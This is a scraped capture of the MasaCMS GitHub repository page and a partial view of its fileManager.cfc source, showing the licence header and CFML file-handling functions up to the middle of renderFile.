=== Content from github.com_e018e81e_20250114_200128.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMasaCMS%2FMasaCMS)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMasaCMS%2FMasaCMS)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=MasaCMS%2FMasaCMS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[MasaCMS](/MasaCMS)
/
**[MasaCMS](/MasaCMS/MasaCMS)**
Public

* [Notifications](/login?return_to=%2FMasaCMS%2FMasaCMS) You must be signed in to change notification settings
* [Fork
  35](/login?return_to=%2FMasaCMS%2FMasaCMS)
* [Star
   72](/login?return_to=%2FMasaCMS%2FMasaCMS)

MASA CMS is an Enterprise Content Management platform based on open source technology.

[www.masacms.com](https://www.masacms.com "https://www.masacms.com")

### License

GPL-2.0, Unknown licenses found

### Licenses found

[GPL-2.0
license.txt](/MasaCMS/MasaCMS/blob/main/./license.txt) [Unknown
COPYING](/MasaCMS/MasaCMS/blob/main/./COPYING)

[72
stars](/MasaCMS/MasaCMS/stargazers) [35
forks](/MasaCMS/MasaCMS/forks) [Branches](/MasaCMS/MasaCMS/branches) [Tags](/MasaCMS/MasaCMS/tags) [Activity](/MasaCMS/MasaCMS/activity)
 [Star](/login?return_to=%2FMasaCMS%2FMasaCMS)

 [Notifications](/login?return_to=%2FMasaCMS%2FMasaCMS) You must be signed in to change notification settings

* [Code](/MasaCMS/MasaCMS)
* [Issues
  9](/MasaCMS/MasaCMS/issues)
* [Pull requests
  0](/MasaCMS/MasaCMS/pulls)
* [Discussions](/MasaCMS/MasaCMS/discussions)
* [Actions](/MasaCMS/MasaCMS/actions)
* [Wiki](/MasaCMS/MasaCMS/wiki)
* [Security](/MasaCMS/MasaCMS/security)
* [Insights](/MasaCMS/MasaCMS/pulse)

Additional navigation options

* [Code](/MasaCMS/MasaCMS)
* [Issues](/MasaCMS/MasaCMS/issues)
* [Pull requests](/MasaCMS/MasaCMS/pulls)
* [Discussions](/MasaCMS/MasaCMS/discussions)
* [Actions](/MasaCMS/MasaCMS/actions)
* [Wiki](/MasaCMS/MasaCMS/wiki)
* [Security](/MasaCMS/MasaCMS/security)
* [Insights](/MasaCMS/MasaCMS/pulse)

# MasaCMS/MasaCMS

    main[Branches](/MasaCMS/MasaCMS/branches)[Tags](/MasaCMS/MasaCMS/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[19,416 Commits](/MasaCMS/MasaCMS/commits/main/) | | |
| [.github/ISSUE\_TEMPLATE](/MasaCMS/MasaCMS/tree/main/.github/ISSUE_TEMPLATE "This path skips through empty directories") | | [.github/ISSUE\_TEMPLATE](/MasaCMS/MasaCMS/tree/main/.github/ISSUE_TEMPLATE "This path skips through empty directories") |  |  |
| [admin](/MasaCMS/MasaCMS/tree/main/admin "admin") | | [admin](/MasaCMS/MasaCMS/tree/main/admin "admin") |  |  |
| [config](/MasaCMS/MasaCMS/tree/main/config "config") | | [config](/MasaCMS/MasaCMS/tree/main/config "config") |  |  |
| [core](/MasaCMS/MasaCMS/tree/main/core "core") | | [core](/MasaCMS/MasaCMS/tree/main/core "core") |  |  |
| [modules](/MasaCMS/MasaCMS/tree/main/modules "modules") | | [modules](/MasaCMS/MasaCMS/tree/main/modules "modules") |  |  |
| [resource\_bundles](/MasaCMS/MasaCMS/tree/main/resource_bundles "resource_bundles") | | [resource\_bundles](/MasaCMS/MasaCMS/tree/main/resource_bundles "resource_bundles") |  |  |
| [sites](/MasaCMS/MasaCMS/tree/main/sites "sites") | | [sites](/MasaCMS/MasaCMS/tree/main/sites "sites") |  |  |
| [themes](/MasaCMS/MasaCMS/tree/main/themes "themes") | | [themes](/MasaCMS/MasaCMS/tree/main/themes "themes") |  |  |
| [.dockerignore](/MasaCMS/MasaCMS/blob/main/.dockerignore ".dockerignore") | | [.dockerignore](/MasaCMS/MasaCMS/blob/main/.dockerignore ".dockerignore") |  |  |
| [.gitignore](/MasaCMS/MasaCMS/blob/main/.gitignore ".gitignore") | | [.gitignore](/MasaCMS/MasaCMS/blob/main/.gitignore ".gitignore") |  |  |
| [Application.cfc](/MasaCMS/MasaCMS/blob/main/Application.cfc "Application.cfc") | | [Application.cfc](/MasaCMS/MasaCMS/blob/main/Application.cfc "Application.cfc") |  |  |
| [COPYING](/MasaCMS/MasaCMS/blob/main/COPYING "COPYING") | | [COPYING](/MasaCMS/MasaCMS/blob/main/COPYING "COPYING") |  |  |
| [Installation.txt](/MasaCMS/MasaCMS/blob/main/Installation.txt "Installation.txt") | | [Installation.txt](/MasaCMS/MasaCMS/blob/main/Installation.txt "Installation.txt") |  |  |
| [README.md](/MasaCMS/MasaCMS/blob/main/README.md "README.md") | | [README.md](/MasaCMS/MasaCMS/blob/main/README.md "README.md") |  |  |
| [SECURITY.md](/MasaCMS/MasaCMS/blob/main/SECURITY.md "SECURITY.md") | | [SECURITY.md](/MasaCMS/MasaCMS/blob/main/SECURITY.md "SECURITY.md") |  |  |
| [box.json](/MasaCMS/MasaCMS/blob/main/box.json "box.json") | | [box.json](/MasaCMS/MasaCMS/blob/main/box.json "box.json") |  |  |
| [gulpfile.js](/MasaCMS/MasaCMS/blob/main/gulpfile.js "gulpfile.js") | | [gulpfile.js](/MasaCMS/MasaCMS/blob/main/gulpfile.js "gulpfile.js") |  |  |
| [htaccess.txt](/MasaCMS/MasaCMS/blob/main/htaccess.txt "htaccess.txt") | | [htaccess.txt](/MasaCMS/MasaCMS/blob/main/htaccess.txt "htaccess.txt") |  |  |
| [index.cfm](/MasaCMS/MasaCMS/blob/main/index.cfm "index.cfm") | | [index.cfm](/MasaCMS/MasaCMS/blob/main/index.cfm "index.cfm") |  |  |
| [license.txt](/MasaCMS/MasaCMS/blob/main/license.txt "license.txt") | | [license.txt](/MasaCMS/MasaCMS/blob/main/license.txt "license.txt") |  |  |
| [package-lock.json](/MasaCMS/MasaCMS/blob/main/package-lock.json "package-lock.json") | | [package-lock.json](/MasaCMS/MasaCMS/blob/main/package-lock.json "package-lock.json") |  |  |
| [package.json](/MasaCMS/MasaCMS/blob/main/package.json "package.json") | | [package.json](/MasaCMS/MasaCMS/blob/main/package.json "package.json") |  |  |
| [web.config.txt](/MasaCMS/MasaCMS/blob/main/web.config.txt "web.config.txt") | | [web.config.txt](/MasaCMS/MasaCMS/blob/main/web.config.txt "web.config.txt") |  |  |
| View all files | | |

## Repository files navigation

* README
* GPL-2.0 license
* License
* Security
# Masa CMS

[Masa CMS](http://www.masacms.com) is a digital experience platform, created by [blueriver](http://www.blueriver.com) as Mura CMS, forked by [We Are North](https://www.wearenorth.eu). Masa CMS was designed to build ambitious web, multi-channel, business-to-business and business-to-employee applications, and create Flow in the digital experience for Content Managers, Content Contributors, Marketers and Developers.

[Masa CMS](http://www.masacms.com) is an open source content management system for CFML, based on the latest open source version of [Mura CMS](http://www.murasoftware.com) created by [blueriver](http://www.blueriver.com), and forked by [We Are North](https://www.wearenorth.eu) to create Masa CMS. Masa CMS has been designed to be used by marketing departments, web designers and developers.

### Masa CMS Resources

* <http://www.masacms.com>
* <https://cfml.slack.com>
* <https://github.com/MasaCMS/MasaCMS/tree/main>

## About

MASA CMS is an Enterprise Content Management platform based on open source technology.

[www.masacms.com](https://www.masacms.com "https://www.masacms.com")

### Topics

[cms](/topics/cms "Topic: cms")
[coldfusion](/topics/coldfusion "Topic: coldfusion")
[content-management](/topics/content-management "Topic: content-management")
[cms-framework](/topics/cms-framework "Topic: cms-framework")
[lucee](/topics/lucee "Topic: lucee")
[hacktoberfest](/topics/hacktoberfest "Topic: hacktoberfest")
[content-management-system](/topics/content-management-system "Topic: content-management-system")
[headless-cms](/topics/headless-cms "Topic: headless-cms")
[cfml](/topics/cfml "Topic: cfml")

### Resources

[Readme](#readme-ov-file)
### License

GPL-2.0, Unknown licenses found

### Licenses found

[GPL-2.0
license.txt](/MasaCMS/MasaCMS/blob/main/./license.txt) [Unknown
COPYING](/MasaCMS/MasaCMS/blob/main/./COPYING)
### Security policy

[Security policy](#security-ov-file)

[Activity](/MasaCMS/MasaCMS/activity)
[Custom properties](/MasaCMS/MasaCMS/custom-properties)
### Stars

[**72**
stars](/MasaCMS/MasaCMS/stargazers)
### Watchers

[**19**
watching](/MasaCMS/MasaCMS/watchers)
### Forks

[**35**
forks](/MasaCMS/MasaCMS/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FMasaCMS%2FMasaCMS&report=MasaCMS+%28user%29)

## [Releases 32](/MasaCMS/MasaCMS/releases)

[v7.4.8
Latest

Jan 8, 2025](/MasaCMS/MasaCMS/releases/tag/7.4.8)
[+ 31 releases](/MasaCMS/MasaCMS/releases)

## [Packages 0](/orgs/MasaCMS/packages?repo_name=MasaCMS)

No packages published

## [Contributors 21](/MasaCMS/MasaCMS/graphs/contributors)

[+ 7 contributors](/MasaCMS/MasaCMS/graphs/contributors)

## Languages

* [ColdFusion
  62.4%](/MasaCMS/MasaCMS/search?l=coldfusion)
* [JavaScript
  20.8%](/MasaCMS/MasaCMS/search?l=javascript)
* [CSS
  9.7%](/MasaCMS/MasaCMS/search?l=css)
* [Less
  6.3%](/MasaCMS/MasaCMS/search?l=less)
* [PLSQL
  0.3%](/MasaCMS/MasaCMS/search?l=plsql)
* [TSQL
  0.3%](/MasaCMS/MasaCMS/search?l=tsql)
* Other
  0.2%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7bb18767_20250114_200138.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMasaCMS%2FMasaCMS%2Fblob%2F9bff7989ab902b2c42499bd4d1582e30d1ec4fe9%2Fcore%2Fmura%2Fcontent%2Ffile%2FfileManager.cfc)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMasaCMS%2FMasaCMS%2Fblob%2F9bff7989ab902b2c42499bd4d1582e30d1ec4fe9%2Fcore%2Fmura%2Fcontent%2Ffile%2FfileManager.cfc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=MasaCMS%2FMasaCMS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[MasaCMS](/MasaCMS)
/
**[MasaCMS](/MasaCMS/MasaCMS)**
Public

* [Notifications](/login?return_to=%2FMasaCMS%2FMasaCMS) You must be signed in to change notification settings
* [Fork
  35](/login?return_to=%2FMasaCMS%2FMasaCMS)
* [Star
   72](/login?return_to=%2FMasaCMS%2FMasaCMS)

* [Code](/MasaCMS/MasaCMS)
* [Issues
  9](/MasaCMS/MasaCMS/issues)
* [Pull requests
  0](/MasaCMS/MasaCMS/pulls)
* [Discussions](/MasaCMS/MasaCMS/discussions)
* [Actions](/MasaCMS/MasaCMS/actions)
* [Wiki](/MasaCMS/MasaCMS/wiki)
* [Security](/MasaCMS/MasaCMS/security)
* [Insights](/MasaCMS/MasaCMS/pulse)

Additional navigation options

* [Code](/MasaCMS/MasaCMS)
* [Issues](/MasaCMS/MasaCMS/issues)
* [Pull requests](/MasaCMS/MasaCMS/pulls)
* [Discussions](/MasaCMS/MasaCMS/discussions)
* [Actions](/MasaCMS/MasaCMS/actions)
* [Wiki](/MasaCMS/MasaCMS/wiki)
* [Security](/MasaCMS/MasaCMS/security)
* [Insights](/MasaCMS/MasaCMS/pulse)

## Files

 9bff798
## Breadcrumbs

1. [MasaCMS](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9)
2. /[core](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core)
3. /[mura](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura)
4. /[content](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura/content)
5. /[file](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura/content/file)
/
# fileManager.cfc

Copy path Blame  Blame
## Latest commit

## History

[History](/MasaCMS/MasaCMS/commits/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura/content/file/fileManager.cfc)executable file·1263 lines (1034 loc) · 48.5 KB 9bff798
## Breadcrumbs

1. [MasaCMS](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9)
2. /[core](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core)
3. /[mura](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura)
4. /[content](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura/content)
5. /[file](/MasaCMS/MasaCMS/tree/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura/content/file)
/
# fileManager.cfc

Top
## File metadata and controls

* Code
* Blame

executable file·1263 lines (1034 loc) · 48.5 KB[Raw](https://github.com/MasaCMS/MasaCMS/raw/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura/content/file/fileManager.cfc)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000<!--- This file is part of Masa CMS. Masa CMS is based on Mura CMS, and adopts the same licensing model. It is, therefore, licensed under the Gnu General Public License version 2 only, (GPLv2) subject to the same special exception that appears in the licensing notice set out below. That exception is also granted by the copyright holders of Masa CMS also applies to this file and Masa CMS in general.
This file has been modified from the original version received from Mura CMS. The change was made on: 2021-07-27Although this file is based on Mura™ CMS, Masa CMS is not associated with the copyright holders or developers of Mura™CMS, and the use of the terms Mura™ and Mura™CMS are retained only to ensure software compatibility, and compliance with the terms of the GPLv2 and the exception set out below. That use is not intended to suggest any commercial relationship or endorsement of Mura™CMS by Masa CMS or its developers, copyright holders or sponsors or visa versa.
If you want an original copy of Mura™ CMS please go to murasoftware.com .  For more information about the unaffiliated Masa CMS, please go to masacms.com
Masa CMS is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, Version 2 of the License. Masa CMS is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
You should have received a copy of the GNU General Public License along with Masa CMS. If not, see <http://www.gnu.org/licenses/>.
The original complete licensing notice from the Mura CMS version of this file is as follows:
This file is part of Mura CMS.
Mura CMS is free software: you can redistribute it and/or modifyit under the terms of the GNU General Public License as published bythe Free Software Foundation, Version 2 of the License.
Mura CMS is distributed in the hope that it will be useful,but WITHOUT ANY WARRANTY; without even the implied warranty ofMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See theGNU General Public License for more details.
You should have received a copy of the GNU General Public Licensealong with Mura CMS. If not, see <http://www.gnu.org/licenses/>.
Linking Mura CMS statically or dynamically with other modules constitutes the preparation of a derivative work based onMura CMS. Thus, the terms and conditions of the GNU General Public License version 2 ("GPL") cover the entire combined work.
However, as a special exception, the copyright holders of Mura CMS grant you permission to combine Mura CMS with programsor libraries that are released under the GNU Lesser General Public License version 2.1.
In addition, as a special exception, the copyright holders of Mura CMS grant you permission to combine Mura CMS withindependent software modules (plugins, themes and bundles), and to distribute these plugins, themes and bundles withoutMura CMS under the license of your choice, provided that you follow these specific guidelines:
Your custom code
• Must not alter any default objects in the Mura CMS database and• May not alter the default display of the Mura CMS logo within Mura CMS and• Must not alter any files in the following directories.
 /admin/ /core/ /Application.cfc /index.cfm
You may copy and distribute Mura CMS with a plug-in, theme or bundle that meets the above guidelines as a combined workunder the terms of GPL for Mura CMS, provided that you include the source code of that other code when and as the GNU GPLrequires distribution of source code.
For clarity, if you create a modified version of Mura CMS, you are not obligated to grant this special exception for yourmodified version; it is your choice whether to do so, or to make such modified version available under the GNU General Public Licenseversion 2 without this exception. You may, if you choose, apply this exception to your own modified versions of Mura CMS.---><cfcomponent extends="mura.cfobject" output="false" hint="This provides file service level logic functionality">
<cffunction name="init" output="false"> <cfargument name="fileDAO" type="any" required="yes"/> <cfargument name="configBean" type="any" required="yes"/> <cfargument name="settingsManager" type="any" required="yes"/>
 <cfset variables.configBean=arguments.configBean /> <cfset variables.fileDAO=arguments.fileDAO /> <cfset variables.settingsManager=arguments.settingsManager />
 <cfif listLen(variables.configBean.getFileStoreAccessInfo(),"^") eq 3> <cfset variables.bucket=listLast(variables.configBean.getFileStoreAccessInfo(),"^") /> <cfelse> <cfset variables.bucket="sava" /> </cfif>
 <cfset variables.imageProcessor=createObject("component","processImgCfimage").init(arguments.configBean,arguments.settingsManager) />
<cfreturn this /></cffunction>
<cffunction name="create" output="false"> <cfargument name="fileObj" type="any" required="yes"/> <cfargument name="contentid" type="any" required="yes"/> <cfargument name="siteid" type="any" required="yes"/> <cfargument name="filename" type="any" required="yes"/> <cfargument name="contentType" type="string" required="yes"/> <cfargument name="contentSubType" type="string" required="yes"/> <cfargument name="fileSize" type="numeric" required="yes"/> <cfargument name="moduleID" type="string" required="yes"/> <cfargument name="fileExt" type="string" required="yes"/> <cfargument name="fileObjSmall" type="any" required="yes"/> <cfargument name="fileObjMedium" type="any" required="yes"/> <cfargument name="fileID" type="any" required="yes" default="#createUUID()#"/> <cfargument name="fileObjSource" type="any" required="yes" default=""/> <cfargument name="credits" type="string" required="yes" default=""/> <cfargument name="caption" type="string" required="yes" default=""/> <cfargument name="alttext" type="string" required="yes" default=""/> <cfargument name="remoteID" type="string" required="yes" default=""/> <cfargument name="remoteURL" type="string" required="yes" default=""/> <cfargument name="remotePubDate" type="string" required="yes" default=""/> <cfargument name="remoteSource" default=""/> <cfargument name="remoteSourceURL" type="string" required="yes" default=""/> <!---<cfargument name="gpsaltitude" type="string" required="yes" default=""/> <cfargument name="gpsaltiuderef" type="string" required="yes" default=""/> <cfargument name="gpslatitude" type="string" required="yes" default=""/> <cfargument name="gpslatituderef" type="string" required="yes" default=""/> <cfargument name="gpslongitude" type="string" required="yes" default=""/> <cfargument name="gpslongituderef" type="string" required="yes" default=""/> <cfargument name="gpsimgdirection" type="string" required="yes" default=""/> <cfargument name="gpstimestamp" type="string" required="yes" default=""/>---> <cfargument name="exif" type="string" required="yes" default=""/>
 <cfset arguments.siteid=variables.settingsManager.getSite(arguments.siteid).getFilePoolID()>
 <cfreturn variables.fileDAO.create(argumentCollection=arguments) />
</cffunction>
<cffunction name="deleteAll" output="false"> <cfargument name="contentID" type="string" required="yes"/>
 <cfset variables.fileDAO.deleteAll(arguments.contentID) />
</cffunction>
<cffunction name="deleteVersion" output="false"> <cfargument name="fileID" type="any" required="yes"/>
 <cfset variables.fileDAO.deleteVersion(arguments.fileID) />
</cffunction>
<cffunction name="deleteIfNotUsed" output="false"> <cfargument name="fileID" type="any" required="yes"/> <cfargument name="contentHistID" type="any" required="yes"/>
 <cfset variables.fileDAO.deleteIfNotUsed(arguments.fileID,arguments.contentHistID) />
</cffunction>
<cffunction name="readMeta" output="false"> <cfargument name="fileID" type="any" required="yes"/>
 <cfreturn variables.fileDAO.readMeta(arguments.fileID) />
</cffunction>
<cffunction name="read" output="false"> <cfargument name="fileID" type="any" required="yes"/>
 <cfreturn variables.fileDAO.read(arguments.fileID) />
</cffunction>
<cffunction name="readAll" output="false"> <cfargument name="fileID" type="any" required="yes"/>
 <cfreturn variables.fileDAO.readAll(arguments.fileID) />
</cffunction>
<cffunction name="readSmall" output="false"> <cfargument name="fileID" type="any" required="yes"/>
 <cfreturn variables.fileDAO.readSmall(arguments.fileID) />
</cffunction>
<cffunction name="readMedium" output="false"> <cfargument name="fileID" type="any" required="yes"/>
 <cfreturn variables.fileDAO.readMedium(arguments.fileID) />
</cffunction>
<cffunction name="renderFile" output="true"><cfargument name="fileID" type="string"><cfargument name="method" type="string" required="true" default="inline"><cfargument name="size" type="string" required="true" default="">
 <cfset var rsFileData="" /> <cfset var delim="" /> <cfset var theFile="" /> <cfset var theFileLocation="" /> <cfset var pluginManager=getBean("pluginManager")> <cfset var pluginEvent = createObject("component","mura.event") /> <cfset var fileCheck="" />
 <cfif not len(arguments.method)> <cfset arguments.method="inline"> </cfif>
 <cfif not isValid("UUID",arguments.fileID) or find(".",arguments.size)> <cfset getBean("contentServer").render404()> </cfif>
 <cfswitch expression="#variables.configBean.getFileStore()#"> <cfcase value="database"> <cfset rsFileData=read(arguments.fileid) /> <cfif not rsFileData.recordcount> <cfset getBean("contentServer").render404()> </cfif> <cfset arguments.siteID=rsFileData.siteid> <cfset arguments.rsFile=rsFileData> <cfset pluginEvent.init(arguments)> <cfset pluginManager.announceEvent("onBeforeFileRender",pluginEvent)> <cfheader name="Content-Disposition" value='#arguments.method#;filename="#rsfileData.filename#"'> <cfheader name="Content-Length" value="#arrayLen(rsFileData.image)#"> <cfif variables.configBean.getCompiler() eq 'Adobe'> <cfset createObject("component","mura.content.file.renderAdobe").init("#rsfileData.contentType#/#rsfileData.contentSubType#",rsFileData.image)> <cfelse> <cfset createObject("component","mura.content.file.renderLucee").init("#rsfileData.contentType#/#rsfileData.contentSubType#",rsFileData.image)> </cfif> <cfset pluginManager.announceEvent("onAfterFileRender",pluginEvent)> </cfcase> <cfcase value="filedir"> <cfset rsFileData=readMeta(arguments.fileid) /> <cfif not rsFileData.recordcount> <cfset getBean("contentServer").render404()> </cfif> <cfset arguments.siteID=rsFileData.siteid> <cfset arguments.rsFile=rsFileData> <cfset pluginEvent.init(arguments)> <cfset pluginManager.announceEvent("onBeforeFileRender",pluginEvent)>
